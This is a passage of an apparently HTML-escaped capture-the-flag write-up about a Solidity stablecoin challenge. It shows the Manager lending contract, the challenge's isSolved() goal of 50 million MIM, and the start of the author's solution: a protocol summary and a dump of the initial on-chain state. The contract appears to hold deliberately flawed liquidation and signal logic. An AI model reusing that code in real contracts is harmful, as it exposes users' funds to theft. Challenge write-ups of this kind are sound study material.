&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public constant MIN_CR = 130 * ProtocolMath.ONE &#x2F; 100; &#x2F;&#x2F; 130%
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public constant DECAY_FACTOR = 999_027_758_833_783_000;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    Token public immutable mim;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(address =&amp;gt; IERC20) public positionCollateral;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(IERC20 =&amp;gt; Collateral) public collateralData;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    struct Collateral {
&lt;&#x2F;span&gt;&lt;span&gt;        ERC20Signal protocolCollateralToken;
&lt;&#x2F;span&gt;&lt;span&gt;        ERC20Signal protocolDebtToken;
&lt;&#x2F;span&gt;&lt;span&gt;        PriceFeed priceFeed;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 operationTime;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 baseRate;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    error NothingToLiquidate();
&lt;&#x2F;span&gt;&lt;span&gt;    error CannotLiquidateLastPosition();
&lt;&#x2F;span&gt;&lt;span&gt;    error RedemptionSpreadOutOfRange();
&lt;&#x2F;span&gt;&lt;span&gt;    error NoCollateralOrDebtChange();
&lt;&#x2F;span&gt;&lt;span&gt;    error InvalidPosition();
&lt;&#x2F;span&gt;&lt;span&gt;    error NewICRLowerThanMCR(uint256 newICR);
&lt;&#x2F;span&gt;&lt;span&gt;    error NetDebtBelowMinimum(uint256 netDebt);
&lt;&#x2F;span&gt;&lt;span&gt;    error FeeExceedsMaxFee(uint256 fee, uint256 amount, uint256 maxFeePercentage);
&lt;&#x2F;span&gt;&lt;span&gt;    error PositionCollateralTokenMismatch();
&lt;&#x2F;span&gt;&lt;span&gt;    error CollateralTokenAlreadyAdded();
&lt;&#x2F;span&gt;&lt;span&gt;    error CollateralTokenNotAdded();
&lt;&#x2F;span&gt;&lt;span&gt;    error SplitLiquidationCollateralCannotBeZero();
&lt;&#x2F;span&gt;&lt;span&gt;    error WrongCollateralParamsForFullRepayment();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor() {
&lt;&#x2F;span&gt;&lt;span&gt;        mim = new Token(address(this), &amp;quot;MIM&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function manage(
&lt;&#x2F;span&gt;&lt;span&gt;        IERC20 token,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 collateralDelta,
&lt;&#x2F;span&gt;&lt;span&gt;        bool collateralIncrease,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 debtDelta,
&lt;&#x2F;span&gt;&lt;span&gt;        bool debtIncrease
&lt;&#x2F;span&gt;&lt;span&gt;    ) external returns (uint256, uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        if (address(collateralData[token].protocolCollateralToken) == address(0)) {
&lt;&#x2F;span&gt;&lt;span&gt;            revert CollateralTokenNotAdded();
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (positionCollateral[msg.sender] != IERC20(address(0)) &amp;amp;&amp;amp; positionCollateral[msg.sender] != token) {
&lt;&#x2F;span&gt;&lt;span&gt;            revert PositionCollateralTokenMismatch();
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (collateralDelta == 0 &amp;amp;&amp;amp; debtDelta == 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            revert NoCollateralOrDebtChange();
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Collateral memory collateralTokenInfo = collateralData[token];
&lt;&#x2F;span&gt;&lt;span&gt;        ERC20Signal protocolCollateralToken = collateralTokenInfo.protocolCollateralToken;
&lt;&#x2F;span&gt;&lt;span&gt;        ERC20Signal protocolDebtToken = collateralTokenInfo.protocolDebtToken;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 debtBefore = protocolDebtToken.balanceOf(msg.sender);
&lt;&#x2F;span&gt;&lt;span&gt;        if (!debtIncrease &amp;amp;&amp;amp; (debtDelta == type(uint256).max || (debtBefore != 0 &amp;amp;&amp;amp; debtDelta == debtBefore))) {
&lt;&#x2F;span&gt;&lt;span&gt;            if (collateralDelta != 0 || collateralIncrease) {
&lt;&#x2F;span&gt;&lt;span&gt;                revert WrongCollateralParamsForFullRepayment();
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;            collateralDelta = protocolCollateralToken.balanceOf(msg.sender);
&lt;&#x2F;span&gt;&lt;span&gt;            debtDelta = debtBefore;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        _updateDebt(token, protocolDebtToken, debtDelta, debtIncrease);
&lt;&#x2F;span&gt;&lt;span&gt;        _updateCollateral(token, protocolCollateralToken, collateralDelta, collateralIncrease);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 debt = protocolDebtToken.balanceOf(msg.sender);
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 collateral = protocolCollateralToken.balanceOf(msg.sender);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (debt == 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            if (collateral != 0) {
&lt;&#x2F;span&gt;&lt;span&gt;                revert InvalidPosition();
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;            _closePosition(protocolCollateralToken, protocolDebtToken, msg.sender, false);
&lt;&#x2F;span&gt;&lt;span&gt;        } else {
&lt;&#x2F;span&gt;&lt;span&gt;            _checkPosition(token, debt, collateral);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            if (debtBefore == 0) {
&lt;&#x2F;span&gt;&lt;span&gt;                positionCollateral[msg.sender] = token;
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        return (collateralDelta, debtDelta);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function liquidate(address liquidatee) external {
&lt;&#x2F;span&gt;&lt;span&gt;        IERC20 token = positionCollateral[liquidatee];
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (address(token) == address(0)) {
&lt;&#x2F;span&gt;&lt;span&gt;            revert NothingToLiquidate();
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Collateral memory collateralTokenInfo = collateralData[token];
&lt;&#x2F;span&gt;&lt;span&gt;        ERC20Signal protocolCollateralToken = collateralTokenInfo.protocolCollateralToken;
&lt;&#x2F;span&gt;&lt;span&gt;        ERC20Signal protocolDebtToken = collateralTokenInfo.protocolDebtToken;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 wholeCollateral = protocolCollateralToken.balanceOf(liquidatee);
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 wholeDebt = protocolDebtToken.balanceOf(liquidatee);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        (uint256 price,) = collateralTokenInfo.priceFeed.fetchPrice();
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 health = ProtocolMath._computeHealth(wholeCollateral, wholeDebt, price);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (health &amp;gt;= MIN_CR) {
&lt;&#x2F;span&gt;&lt;span&gt;            revert NothingToLiquidate();
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 totalDebt = protocolDebtToken.totalSupply();
&lt;&#x2F;span&gt;&lt;span&gt;        if (wholeDebt == totalDebt) {
&lt;&#x2F;span&gt;&lt;span&gt;            revert CannotLiquidateLastPosition();
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (!(health &amp;lt;= ProtocolMath.ONE)) {
&lt;&#x2F;span&gt;&lt;span&gt;            mim.burn(msg.sender, wholeDebt);
&lt;&#x2F;span&gt;&lt;span&gt;            totalDebt -= wholeDebt;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        token.safeTransfer(msg.sender, wholeCollateral);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        _closePosition(protocolCollateralToken, protocolDebtToken, liquidatee, true);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        _updateSignals(token, protocolCollateralToken, protocolDebtToken, totalDebt);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function addCollateralToken(IERC20 token, PriceFeed priceFeed, uint256 collateralSignal, uint256 debtSignal)
&lt;&#x2F;span&gt;&lt;span&gt;        external
&lt;&#x2F;span&gt;&lt;span&gt;        onlyOwner
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        ERC20Signal protocolCollateralToken = new ERC20Signal(
&lt;&#x2F;span&gt;&lt;span&gt;            address(this),
&lt;&#x2F;span&gt;&lt;span&gt;            collateralSignal,
&lt;&#x2F;span&gt;&lt;span&gt;            string(bytes.concat(&amp;quot;MIM &amp;quot;, bytes(IERC20Metadata(address(token)).name()), &amp;quot; collateral&amp;quot;)),
&lt;&#x2F;span&gt;&lt;span&gt;            string(bytes.concat(&amp;quot;mim&amp;quot;, bytes(IERC20Metadata(address(token)).symbol()), &amp;quot;-c&amp;quot;))
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;        ERC20Signal protocolDebtToken = new ERC20Signal(
&lt;&#x2F;span&gt;&lt;span&gt;            address(this),
&lt;&#x2F;span&gt;&lt;span&gt;            debtSignal,
&lt;&#x2F;span&gt;&lt;span&gt;            string(bytes.concat(&amp;quot;MIM &amp;quot;, bytes(IERC20Metadata(address(token)).name()), &amp;quot; debt&amp;quot;)),
&lt;&#x2F;span&gt;&lt;span&gt;            string(bytes.concat(&amp;quot;mim&amp;quot;, bytes(IERC20Metadata(address(token)).symbol()), &amp;quot;-d&amp;quot;))
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (address(collateralData[token].protocolCollateralToken) != address(0)) {
&lt;&#x2F;span&gt;&lt;span&gt;            revert CollateralTokenAlreadyAdded();
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Collateral memory protocolCollateralTokenInfo;
&lt;&#x2F;span&gt;&lt;span&gt;        protocolCollateralTokenInfo.protocolCollateralToken = protocolCollateralToken;
&lt;&#x2F;span&gt;&lt;span&gt;        protocolCollateralTokenInfo.protocolDebtToken = protocolDebtToken;
&lt;&#x2F;span&gt;&lt;span&gt;        protocolCollateralTokenInfo.priceFeed = priceFeed;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        collateralData[token] = protocolCollateralTokenInfo;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _updateDebt(IERC20 token, ERC20Signal protocolDebtToken, uint256 debtDelta, bool debtIncrease) internal {
&lt;&#x2F;span&gt;&lt;span&gt;        if (debtDelta == 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            return;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (debtIncrease) {
&lt;&#x2F;span&gt;&lt;span&gt;            _decayRate(token);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            protocolDebtToken.mint(msg.sender, debtDelta);
&lt;&#x2F;span&gt;&lt;span&gt;            mim.mint(msg.sender, debtDelta);
&lt;&#x2F;span&gt;&lt;span&gt;        } else {
&lt;&#x2F;span&gt;&lt;span&gt;            protocolDebtToken.burn(msg.sender, debtDelta);
&lt;&#x2F;span&gt;&lt;span&gt;            mim.burn(msg.sender, debtDelta);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _updateCollateral(
&lt;&#x2F;span&gt;&lt;span&gt;        IERC20 token,
&lt;&#x2F;span&gt;&lt;span&gt;        ERC20Signal protocolCollateralToken,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 collateralDelta,
&lt;&#x2F;span&gt;&lt;span&gt;        bool collateralIncrease
&lt;&#x2F;span&gt;&lt;span&gt;    ) internal {
&lt;&#x2F;span&gt;&lt;span&gt;        if (collateralDelta == 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            return;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (collateralIncrease) {
&lt;&#x2F;span&gt;&lt;span&gt;            protocolCollateralToken.mint(msg.sender, collateralDelta);
&lt;&#x2F;span&gt;&lt;span&gt;            token.safeTransferFrom(msg.sender, address(this), collateralDelta);
&lt;&#x2F;span&gt;&lt;span&gt;        } else {
&lt;&#x2F;span&gt;&lt;span&gt;            protocolCollateralToken.burn(msg.sender, collateralDelta);
&lt;&#x2F;span&gt;&lt;span&gt;            token.safeTransfer(msg.sender, collateralDelta);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _updateSignals(
&lt;&#x2F;span&gt;&lt;span&gt;        IERC20 token,
&lt;&#x2F;span&gt;&lt;span&gt;        ERC20Signal protocolCollateralToken,
&lt;&#x2F;span&gt;&lt;span&gt;        ERC20Signal protocolDebtToken,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 totalDebtForCollateral
&lt;&#x2F;span&gt;&lt;span&gt;    ) internal {
&lt;&#x2F;span&gt;&lt;span&gt;        protocolDebtToken.setSignal(totalDebtForCollateral);
&lt;&#x2F;span&gt;&lt;span&gt;        protocolCollateralToken.setSignal(token.balanceOf(address(this)));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function updateSignal(ERC20Signal token, uint256 signal) external onlyOwner {
&lt;&#x2F;span&gt;&lt;span&gt;        token.setSignal(signal);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _closePosition(
&lt;&#x2F;span&gt;&lt;span&gt;        ERC20Signal protocolCollateralToken,
&lt;&#x2F;span&gt;&lt;span&gt;        ERC20Signal protocolDebtToken,
&lt;&#x2F;span&gt;&lt;span&gt;        address position,
&lt;&#x2F;span&gt;&lt;span&gt;        bool burn
&lt;&#x2F;span&gt;&lt;span&gt;    ) internal {
&lt;&#x2F;span&gt;&lt;span&gt;        positionCollateral[position] = IERC20(address(0));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (burn) {
&lt;&#x2F;span&gt;&lt;span&gt;            protocolDebtToken.burn(position, type(uint256).max);
&lt;&#x2F;span&gt;&lt;span&gt;            protocolCollateralToken.burn(position, type(uint256).max);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _decayRate(IERC20 token) internal {
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 decayedRate = _calcDecayedRate(token);
&lt;&#x2F;span&gt;&lt;span&gt;        require(decayedRate &amp;lt;= ProtocolMath.ONE);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        collateralData[token].baseRate = decayedRate;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        _updateOperationTime(token);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _updateOperationTime(IERC20 token) internal {
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 pastTime = block.timestamp - collateralData[token].operationTime;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (1 minutes &amp;lt;= pastTime) {
&lt;&#x2F;span&gt;&lt;span&gt;            collateralData[token].operationTime = block.timestamp;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _calcDecayedRate(IERC20 token) internal view returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 pastMinutes = (block.timestamp - collateralData[token].operationTime) &#x2F; 1 minutes;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 decay = ProtocolMath._decPow(DECAY_FACTOR, pastMinutes);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        return collateralData[token].baseRate.mulDown(decay);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _checkPosition(IERC20 token, uint256 debt, uint256 collateral) internal view {
&lt;&#x2F;span&gt;&lt;span&gt;        if (debt &amp;lt; MIN_DEBT) {
&lt;&#x2F;span&gt;&lt;span&gt;            revert NetDebtBelowMinimum(debt);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        (uint256 price,) = collateralData[token].priceFeed.fetchPrice();
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 health = ProtocolMath._computeHealth(collateral, debt, price);
&lt;&#x2F;span&gt;&lt;span&gt;        if (health &amp;lt; MIN_CR) {
&lt;&#x2F;span&gt;&lt;span&gt;            revert NewICRLowerThanMCR(health);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    receive() external payable {}
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;contract Stablecoin {
&lt;&#x2F;span&gt;&lt;span&gt;    Token public immutable mim;
&lt;&#x2F;span&gt;&lt;span&gt;    Token public immutable eth;
&lt;&#x2F;span&gt;&lt;span&gt;    Manager public immutable manager;
&lt;&#x2F;span&gt;&lt;span&gt;    address public player;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _player, Token _mim, Token _eth, Manager _manager) {
&lt;&#x2F;span&gt;&lt;span&gt;        player = _player;
&lt;&#x2F;span&gt;&lt;span&gt;        mim = _mim;
&lt;&#x2F;span&gt;&lt;span&gt;        eth = _eth;
&lt;&#x2F;span&gt;&lt;span&gt;        manager = _manager;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function isSolved() external view returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        return mim.balanceOf(player) == 50_000_000 ether;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;h2 id=&quot;solution-5&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#solution-5&quot; aria-label=&quot;Anchor link for: solution-5&quot;&gt;Solution&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Bro, this is pain I couldn&#x27;t remember what I did to solve this. Spent more than 3 days (I know I&#x27;m dumb). By doing some magic I was to solve this in the end. I&#x27;ll try my best to explain that magic.&lt;&#x2F;p&gt;
&lt;p&gt;Lets break down the StableCoin protocol,&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Manager (Main Contract)&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Handles adding collateral tokens, managing positions, and liquidations&lt;&#x2F;li&gt;
&lt;li&gt;Maintains collateral and debt signals for each position&lt;&#x2F;li&gt;
&lt;li&gt;Controls the MIM token minting and burning&lt;&#x2F;li&gt;
&lt;li&gt;Key functions:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;manage()&lt;&#x2F;code&gt;: Add&#x2F;remove collateral and debt&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;liquidate()&lt;&#x2F;code&gt;: Liquidate undercollateralized positions&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;addCollateralToken()&lt;&#x2F;code&gt;: Add new collateral types&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;updateSignal()&lt;&#x2F;code&gt;: Update collateral&#x2F;debt signals&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Token&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;ERC20 token contract for MIM stablecoin&lt;&#x2F;li&gt;
&lt;li&gt;Can only be minted&#x2F;burned by the Manager&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ERC20Signal&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Special ERC20 implementation for protocol collateral and debt tokens&lt;&#x2F;li&gt;
&lt;li&gt;Uses a signal multiplier for balance calculations&lt;&#x2F;li&gt;
&lt;li&gt;Cannot be transferred (all transfer functions revert)&lt;&#x2F;li&gt;
&lt;li&gt;Key functions:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mint()&lt;&#x2F;code&gt;: Mints tokens with signal adjustment&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;burn()&lt;&#x2F;code&gt;: Burns tokens with signal adjustment&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;setSignal()&lt;&#x2F;code&gt;: Updates the signal multiplier&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;PriceFeed&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Simple price oracle that returns fixed prices&lt;&#x2F;li&gt;
&lt;li&gt;Returns (2207 ether, 0.01 ether) for price and timestamp&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Stablecoin&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Challenge contract that sets up the initial state&lt;&#x2F;li&gt;
&lt;li&gt;Holds references to MIM, ETH tokens, and Manager&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;The goal is to get 50,000,000 MIM tokens when starting with 6000 ETH.&lt;&#x2F;p&gt;
&lt;p&gt;The Manager owner did the following after protocol deployement,&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;The protocol adds ETH as collateral with a simple price feed and very high limits&lt;&#x2F;li&gt;
&lt;li&gt;Creates an initial position with 2 ETH collateral and 3395 MIM debt&lt;&#x2F;li&gt;
&lt;li&gt;Updates the debt token&#x27;s signal to 3520 ether (this affects debt calculations)&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;Same routene, initial state of the protocol.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Stablecoin&lt;&#x2F;span&gt;&lt;span&gt; :  0xE78Ab96cb44c5dDd3d51e2B96295b27c78D102d9
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Manager&lt;&#x2F;span&gt;&lt;span&gt; :  0xbd79fCDe0e6dC4BC9984Eb5f5AD79EA86bABA0fB
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Manager&lt;&#x2F;span&gt;&lt;span&gt; Owner:  0xf8C9Fb693d7c318C19ae00ABC5d24725F6cBB0BA
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;MIM&lt;&#x2F;span&gt;&lt;span&gt; :  0x7a2B13B63367219128DD46d1ab179a542C17d48a
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;MIM&lt;&#x2F;span&gt;&lt;span&gt; Manager :  0xbd79fCDe0e6dC4BC9984Eb5f5AD79EA86bABA0fB
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ETH&lt;&#x2F;span&gt;&lt;span&gt; :  0xc673093EC4446A0690Aeb98105faeB8528c50693
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ETH&lt;&#x2F;span&gt;&lt;span&gt; Manager :  0xf8C9Fb693d7c318C19ae00ABC5d24725F6cBB0BA
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;protocolCollateralToken&lt;&#x2F;span&gt;&lt;span&gt; :  0xfe49524fEe1b2FeF5Dff149B1A0370cff0d68972
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;protocolCollateralToken&lt;&#x2F;span&gt;&lt;span&gt; Signal:  20000000000000000000000000000000000
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;protocolCollateralToken&lt;&#x2F;span&gt;&lt;span&gt; totalSupply()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;  2000000000000000000
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;protocolDebtToken&lt;&#x2F;span&gt;&lt;span&gt; :  0x89cAaD14ca4eEA0272A2654A31A56D0a509E28fF
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;protocolDebtToken&lt;&#x2F;span&gt;&lt;span&gt; Signal :  1036818851251840943
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;protocolDebtToken&lt;&#x2F;span&gt;&lt;span&gt; totalSupply()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;  3520000000000000001485
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;-------------------------------
